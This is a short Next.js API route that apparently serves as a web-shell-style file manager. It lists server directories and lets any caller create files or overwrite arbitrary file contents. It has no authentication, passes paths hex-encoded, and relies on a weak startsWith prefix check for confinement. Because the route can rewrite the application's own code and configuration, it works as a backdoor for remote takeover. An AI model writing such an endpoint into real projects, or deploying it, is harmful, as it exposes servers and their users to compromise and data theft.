import { NextResponse } from "next/server";
import fs from "fs";
import path from "path";

const ROOT_DIR = process.cwd();

const safePath = (p: string) => {
  const resolved = path.resolve(p);
  if (!resolved.startsWith(ROOT_DIR)) {
    throw new Error("Forbidden path");
  }
  return resolved;
};

const fromHex = (hex: string) => Buffer.from(hex, "hex").toString();

export async function GET(req: Request) {
  try {
    const { searchParams } = new URL(req.url);
    const hexPath = searchParams.get("p") || "";
    const currentPath = hexPath ? safePath(fromHex(hexPath)) : ROOT_DIR;

    const items = fs.readdirSync(currentPath).map(name => {
      const full = path.join(currentPath, name);
      const st = fs.statSync(full);
      return {
        name,
        path: Buffer.from(full).toString("hex"),
        type: st.isDirectory() ? "d" : "f",
        size: st.size,
        perms: (st.mode & 0o777).toString(8),
        modified: st.mtime
      };
    });

    return NextResponse.json({ path: currentPath, items });
  } catch (err:any) {
    return NextResponse.json({ error: err.message }, { status: 500 });
  }
}

export async function PUT(req: Request) {
  const { p, content } = await req.json();
  const filePath = safePath(fromHex(p));
  fs.writeFileSync(filePath, content ?? "");
  return NextResponse.json({ ok: true });
}

export async function POST(req: Request) {
  const { dir, name } = await req.json();
  const target = safePath(path.join(dir, name));
  fs.writeFileSync(target, "");
  return NextResponse.json({ ok: true });
}